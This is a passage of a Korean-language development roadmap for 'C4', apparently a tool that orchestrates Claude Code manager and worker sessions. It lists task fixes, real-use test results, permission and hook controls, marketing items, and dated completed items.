| 5.51 | pendingTask 근본 해결 | **done** | idle handler pendingTask 블록에 setupDone 가드 추가. _executeSetupPhase2 완료 후 post-setup 전달 트리거 추가. active polling _chunkedWrite await 처리. 근본 원인: setupPhase='done'~setupDone=true 사이 1000ms 창에서 idle handler가 effort 블록을 관통하여 모델 메뉴 활성 상태에서 task 전송 |

## Phase 6 - 마케팅/가시성

| # | 항목 | 상태 | 설명 |
|---|------|------|------|
| 6.1 | README 한 줄 요약 강화 | **done** | 상단에 독보적 기능 한 문장 |
| 6.2 | asciinema 데모 | **done** | c4 auto 터미널 녹화. README에 GIF 삽입. docs/best-practices.md에 녹화 가이드 작성 |
| 6.3 | GitHub Topics | **done** | #claude-code #agent-orchestrator 등 태그 추가 |
| 6.4 | MCP 서버 등록 | **done** | smithery.ai 등록 절차 + Claude Code MCP 설정 + 수동 테스트 가이드. docs/best-practices.md |
| 6.5 | Build in Public 자동화 | **done** | 콘텐츠 소스/채널/일정/내러티브 전략. Scribe 기반 파이프라인 설계. docs/best-practices.md |
| 6.6 | 경쟁 키워드 선점 | **done** | Manager Rotation, Recursive Worker 등을 README/docs에 반복 노출 |
| 6.7 | docs/best-practices.md | **done** | 실사용 패턴 6선 + 데모 시나리오 + MCP 등록 + Build in Public. docs/best-practices.md |

## Phase 7 — 실사용 검증 + 안정화

| # | 항목 | 상태 | 설명 |
|---|------|------|------|
| 7.1 | pendingTask Enter 안 먹히는 케이스 재조사 | **done** | 근본 원인: 5.18에서 send()에만 적용한 "input/CR 분리 전송"이 9개 pendingTask delivery 경로에 전파되지 않음. `_writeTaskAndEnter()` 헬퍼로 모든 경로 교체. 5개 단위 테스트 추가. |
| 7.2 | agent 모드 Read deny 실효성 검증 | **todo** | --agent manager.md로 시작해도 관리자가 Read/Explore 사용 가능. deny가 제안일 뿐 강제가 아닌지 확인. Claude Code Custom Agent 도구 제한 동작 검증. |
| 7.3 | c4 watch 실사용 테스트 | **done** | SSE 연결 성공, 실시간 PTY 출력(ANSI 포함) 스트리밍 확인. c4 send 후 watch에서 입력/응답 모두 수신됨. |
| 7.4 | c4 batch 실사용 테스트 | **done** | c4 batch --count 3 "hello" → batch-1/2/3 자동 생성 + task 전송 완료. 3 created, 0 failed. |
| 7.5 | c4 approve N 실사용 테스트 | **partial** | API 경로 정상 (에러 메시지 정확: "not awaiting critical approval"). 단위 테스트 통과. 실제 critical_deny 트리거 불가 — Claude가 rm -rf 실행 자체 거부, TUI 프롬프트 미표시. autonomyLevel 4 + deny 규칙 + TUI 프롬프트 3조건 충족 어려움. |
| 7.6 | c4 wait --all 실사용 테스트 | **done** | batch-1/2/3 동시 대기 → batch-2 첫 idle 감지 즉시 반환. name=batch-2 status=idle. |
| 7.7 | c4 wait --interrupt-on-intervention 실사용 테스트 | **partial** | 플래그 파싱/API 전달 정상 (interruptOnIntervention=1). 단위 테스트(parallel-wait) 통과. 실제 intervention 트리거 불가 — Claude 응답이 question 패턴("할까요?", "어떻게" 등)과 불일치. |
| 7.8 | DGX 최신 코드 테스트 | **todo** | DGX에서 git pull + npm install + npm test + c4 daemon start 확인. |
| 7.9 | worktree 잔여물 정리 검증 | **todo** | worker close 후 c4-worktree-* 디렉토리와 c4/ 브랜치가 완전히 정리되는지 반복 테스트. |
| 7.10 | 전체 npm test 통과 확인 | **done** | 47개 전부 통과 확인 (관리자 세션에서 직접 실행) |
| 7.11 | 재귀적 테스트 구조 | **todo** | 관리자 세션 -> c4 new test-mgr -> test-mgr이 c4 watch/batch/approve/wait 테스트 실행. 관리자가 직접 compound 명령 안 쓰고 worker에 위임하는 패턴 검증. |
| 7.12 | manager.md에 테스트 위임 규칙 추가 | **todo** | c4 명령어 테스트도 worker에 위임하도록 manager.md에 명시. "c4 명령어를 직접 실행하지 마. 테스트도 worker를 만들어서 시켜." 사용자가 매번 지시하지 않아도 알아서 되게. |
| 7.13 | c4 init Linux PATH 등록 개선 | **todo** | DGX에서 c4 명령어를 찾을 수 없음. c4 init이 ~/.local/bin/c4 심볼릭 링크를 자동 생성해야 함. 현재는 npm link 실패 시 wrapper script 생성하지만 Linux에서 권한 문제로 실패. init에서 자동 심볼릭 + bashrc alias 폴백. |
| 7.14 | c4 init 후 --agent 안내 | **todo** | c4 init 완료 후 "관리자 모드로 시작하려면: claude --agent .claude/agents/manager.md" 안내 메시지 출력. |
| 7.15 | git pull 후 daemon 재시작 필요 안내 | **todo** | DGX에서 git pull로 최신 코드 받았지만 daemon은 옛날 코드로 실행 중. pull 후 자동으로 daemon restart 하거나, 최소한 "daemon 재시작 필요" 경고 출력. c4 init이나 pull 감지 hook에서 처리. |
| 7.16 | PreToolUse hook error 인코딩 깨짐 | **todo** | hook error 메시지에 한국어 깨짐: "Failed with non-blocking status code: ????? ??:1 ????:28". 반복 발생하여 escalation 오탐 유발. hook command의 stderr 인코딩 처리 또는 에러 메시지 파싱 개선. |
| 7.17 | pendingTask 5.51 수정 후에도 재발 | **todo** | 3개 worker 전부 Enter 안 먹힘. 5.51 수정(setupDone 가드 + post-setup 트리거)이 충분하지 않음. Windows에서만 발생하는지 DGX에서도 발생하는지 비교 필요. |
| 7.18 | worker 영어 전용 모드 | **todo** | sendTask rules에 "Respond in English only" 추가하여 worker가 영어로만 동작. 한국어 인코딩 깨짐(7.16) 우회 + hook error 방지. config에 workerLanguage: "en" 옵션 추가. |

## 완료

| # | 항목 | 완료일 |
|---|------|--------|
| ~~0.1~~ | PTY 기반 데몬 + CLI 구현 | 2026-04-02 |
| ~~0.2~~ | ScreenBuffer 가상 터미널 | 2026-04-02 |
| ~~0.3~~ | SSH 원격 작업자 지원 | 2026-04-02 |
| ~~0.4~~ | config.json 설정 시스템 | 2026-04-02 |
| ~~0.5~~ | autoApprove 기본 구조 | 2026-04-02 |
| ~~1.1~~ | autoApprove 패턴 매칭 + 버전 호환성 | 2026-04-02 |
| ~~1.3~~ | 작업자 초기 설정 자동화 (trust + max effort) | 2026-04-02 |
| ~~1.5~~ | Git 브랜치 격리 + c4 task 명령 | 2026-04-02 |
| ~~1.4~~ | Git Bash 경로 변환 해결 (main cherry-pick) | 2026-04-03 |
| ~~1.12~~ | git worktree 지원 | 2026-04-03 |
| ~~1.10~~ | `c4 init` 명령 | 2026-04-03 |
| ~~1.11~~ | `c4 merge` + main 보호 | 2026-04-03 |
| ~~1.7~~ | 작업자 헬스체크 + 자동 재시작 | 2026-04-03 |
| ~~1.15~~ | effort 자동 설정 안정화 | 2026-04-03 |
| ~~1.6~~ | Scribe 시스템 (컨텍스트 영속화) | 2026-04-03 |
| ~~1.16~~ | `c4 merge --skip-checks` | 2026-04-03 |
| ~~2.7~~ | 로그 관리 및 세션 복구 | 2026-04-03 |
| ~~1.17~~ | worktree에서 main 보호 hook 적용 | 2026-04-03 |
| ~~1.8~~ | 작업 스코프 정의 + 이탈 감시 | 2026-04-03 |
| ~~1.9~~ | 관리자 개입 프로토콜 | 2026-04-03 |
| ~~2.2~~ | 작업 의존성/순서 보장 | 2026-04-03 |
| ~~2.3~~ | 중복 작업 방지 | 2026-04-03 |
| ~~2.8~~ | API rate limit 큐잉 | 2026-04-03 |
| ~~2.4~~ | SSH 끊김 복구 | 2026-04-03 |
| ~~2.5~~ | 토큰 사용량 모니터링 | 2026-04-03 |
| ~~2.9~~ | 자율 운영 구조 | 2026-04-03 |
| ~~3.1~~ | 작업자 간 컨텍스트 전달 | 2026-04-03 |
| ~~3.2~~ | 작업 결과 자동 검증 | 2026-04-03 |
| ~~3.3~~ | effort 동적 조절 | 2026-04-03 |
| ~~3.4~~ | 작업자 풀링 | 2026-04-03 |
| ~~3.5~~ | 이벤트 기반 알림 (SSE) | 2026-04-03 |
| ~~3.6~~ | 롤백 지원 | 2026-04-03 |
| ~~3.7~~ | 작업 히스토리 영속화 | 2026-04-03 |
| ~~3.8~~ | ScreenBuffer 개선 | 2026-04-03 |
| ~~3.15~~ | Hook 기반 아키텍처 전환 | 2026-04-03 |
| ~~3.16~~ | 작업자별 settings.json 자동 생성 | 2026-04-03 |
| ~~3.17~~ | Subagent Swarm 지원 | 2026-04-03 |
| ~~3.18~~ | 역할별 작업자 템플릿 | 2026-04-03 |
| ~~3.19~~ | Auto Mode 연동 | 2026-04-03 |
| ~~3.20~~ | Linux/macOS 지원 | 2026-04-03 |
| ~~1.2~~ | 데몬 안정화 | 2026-04-02 |
| ~~1.13~~ | CLAUDE.md 규칙 강제 이행 | 2026-04-03 |
| ~~1.14~~ | 재귀적 C4 구조 | 2026-04-03 |
| ~~2.6~~ | 타임아웃 정책 | 2026-04-03 |
| ~~3.9~~ | MCP 서버 모드 | 2026-04-03 |
| ~~3.10~~ | Planner Worker | 2026-04-03 |
| ~~3.11~~ | State Machine | 2026-04-03 |
| ~~3.12~~ | Adaptive Polling | 2026-04-03 |
| ~~3.13~~ | Interface Abstraction | 2026-04-03 |
| ~~3.14~~ | Summary Layer | 2026-04-03 |
| ~~4.2~~ | Hook 이벤트 JSONL 영속화 | 2026-04-04 |
| ~~4.3~~ | 승인 요청 웹 UI (Dashboard) | 2026-04-04 |
| ~~4.4~~ | 아침 보고서 자동 생성 | 2026-04-03 |
| ~~4.6~~ | PreToolUse hook으로 복합 명령 차단 | 2026-04-03 |
| ~~4.8~~ | c4 auto 원커맨드 실행 | 2026-04-03 |
| ~~4.9~~ | 작업자 .claude/settings.json 프리셋 | 2026-04-03 |
| ~~4.10~~ | 관리자-작업자 간 Hook 기반 통신 | 2026-04-03 |
| ~~4.11~~ | c4 status 명령 + AI 요약 알림 | 2026-04-03 |
| ~~4.13~~ | config.example.json + CLAUDE.md 최신화 | 2026-04-04 |
| ~~4.14~~ | _getLastActivity JSONL 기반 전환 | 2026-04-04 |
| ~~4.15~~ | notifyStall 긴급 알림 | 2026-04-04 |
| ~~4.16~~ | alertOnly 모드 | 2026-04-04 |
| ~~4.1~~ | 완전 무인 운영 모드 (claude --resume) | 2026-04-04 |
| ~~4.5~~ | 관리자 자동 컨펌 정책 (Level 4) | 2026-04-04 |
| ~~4.7~~ | 관리자 컨텍스트 한계 자동 대응 (자동 교체) | 2026-04-04 |
| ~~BF-1~~ | pending-task worktree 미생성 버그 수정 | 2026-04-04 |
| ~~BF-2~~ | slack-activity hook 디버깅 + PTY fallback | 2026-04-04 |
| ~~4.19~~ | Slack task 요약 절단 버그 수정 | 2026-04-04 |
| ~~4.20~~ | notifyHealthCheck 상태 누락 수정 | 2026-04-04 |
| ~~4.22~~ | SSH target worktree 생성 방지 | 2026-04-04 |
| ~~4.23~~ | 트러블슈팅 가이드 | 2026-04-04 |
| ~~4.24~~ | 알림 동작 수정 | 2026-04-04 |
| ~~4.12~~ | 메시지 채널 확장 (Discord/Telegram/KakaoWork) | 2026-04-04 |
| ~~4.17~~ | auto-resume idle 큐 확인 + worktree 완전 hook 세트 | 2026-04-04 |
| ~~4.18~~ | merge-homedir config 폴백 | 2026-04-04 |
| ~~4.21~~ | 좀비 데몬 정리 | 2026-04-04 |
| ~~4.25~~ | Windows 콘솔 창 숨김 (windowsHide) | 2026-04-05 |
| ~~5.1~~ | auto-mgr 도구 제한 | 2026-04-05 |
| ~~5.2~~ | 실사용 테스트 시나리오 | 2026-04-05 |
| ~~5.3~~ | CLAUDE.md 개선 | 2026-04-05 |
| ~~5.4~~ | worker close 시 Slack flush | 2026-04-05 |
| ~~5.8~~ | Custom Agents 활용 (.claude/agents/manager.md) | 2026-04-05 |
| ~~5.10~~ | Hook으로 권한 요청 Slack 라우팅 | 2026-04-05 |
| ~~5.11~~ | Batch 처리 (c4 batch) | 2026-04-05 |
| ~~5.12~~ | 매니저 교체 시 의사결정 요약 주입 | 2026-04-05 |
| ~~5.13~~ | L4 Critical Deny List | 2026-04-05 |
| ~~5.14~~ | Resume 후 Re-orientation | 2026-04-05 |
| ~~5.15~~ | Dirty Worktree Slack 경고 | 2026-04-05 |
| ~~5.16~~ | --repo 옵션 | 2026-04-05 |
| ~~5.17~~ | c4 task --repo 옵션 구현 | 2026-04-05 |
| ~~5.19~~ | PreToolUse 복합 명령 차단 실효성 | 2026-04-05 |
| ~~5.20~~ | CI 피드백 루프 | 2026-04-05 |
| ~~5.21~~ | 하이브리드 안전 모드 | 2026-04-05 |
| ~~5.22~~ | Recursive C4 테스트 시나리오 | 2026-04-05 |
| ~~5.23~~ | 경쟁자 분석 문서 | 2026-04-05 |
| ~~5.24~~ | worker auto-approve 범위 확장 | 2026-04-05 |
| ~~5.25~~ | 다른 프로젝트 브랜치 정리 | 2026-04-05 |
| ~~5.27~~ | 실사용 실패 케이스 문서화 | 2026-04-05 |
| ~~5.28~~ | 관리자 자동 승인 방지 | 2026-04-05 |
| ~~5.29~~ | intervention 발생 시 관리자 알림 | 2026-04-05 |
| ~~5.30~~ | 서브모듈 프로젝트 diff 지원 | 2026-04-05 |
| ~~5.31~~ | 다른 repo 브랜치 자동 정리 | 2026-04-05 |
| ~~5.32~~ | worktree prune 자동화 | 2026-04-05 |
| ~~5.33~~ | c4 cleanup 명령 | 2026-04-05 |
| ~~5.34~~ | autoApprove에 개발 도구 추가 | 2026-04-05 |
| ~~5.37~~ | --no-branch/--cwd 외부 repo 지원 개선 | 2026-04-05 |
| ~~5.9~~ | claude -w 네이티브 worktree 검토 | 2026-04-16 |
| ~~5.18~~ | c4 send 자동 Enter | 2026-04-16 |
| ~~5.26~~ | worker 권한 프로파일 (web/ml/infra) | 2026-04-16 |
| ~~5.35~~ | 긴 task 메시지 잘림 근본 수정 | 2026-04-16 |
| ~~5.36~~ | c4 approve 편의 명령 | 2026-04-16 |
| ~~5.38~~ | Slack 메시지 길이 제한 + task 요약 포함 | 2026-04-16 |
| ~~5.39~~ | 관리자 c4 list 무한 반복 방지 (10초 cooldown) | 2026-04-16 |
| ~~5.40~~ | worker 자동 네이밍 | 2026-04-16 |
| ~~5.41~~ | worktree close 후 정리 검증 | 2026-04-16 |
| ~~5.42~~ | c4 watch 실시간 스트리밍 | 2026-04-16 |
| ~~5.43~~ | 관리자 병렬 wait | 2026-04-16 |
| ~~5.44~~ | interrupt-on-intervention | 2026-04-16 |
| ~~5.45~~ | 관리자 역할 가이드 강화 (승인 프로토콜) | 2026-04-16 |
| ~~5.46~~ | 복합 명령 차단으로 작업 불가 실패 사례 | 2026-04-16 |
| ~~5.47~~ | PreToolUse 복합 명령 차단 정책 재검토 | 2026-04-16 |
| ~~5.48~~ | Claude Code compound command 승인 prompt | 2026-04-16 |
| ~~5.49~~ | task 메시지 # 특수문자 승인 prompt | 2026-04-16 |
| ~~5.50~~ | 관리자 git -C 미사용 문제 | 2026-04-16 |
| ~~5.51~~ | pendingTask 근본 해결 | 2026-04-16 |
| ~~6.1~~ | README 한 줄 요약 강화 | 2026-04-16 |
| ~~6.2~~ | asciinema 데모 가이드 | 2026-04-16 |
| ~~6.3~~ | GitHub Topics 추가 | 2026-04-16 |
| ~~6.4~~ | MCP 서버 등록 가이드 | 2026-04-16 |
| ~~6.5~~ | Build in Public 전략 | 2026-04-16 |
| ~~6.6~~ | 경쟁 키워드 선점 | 2026-04-16 |
| ~~6.7~~ | docs/best-practices.md | 2026-04-16 |
| ~~7.1~~ | pendingTask Enter 안 먹히는 케이스 재조사 | 2026-04-17 |
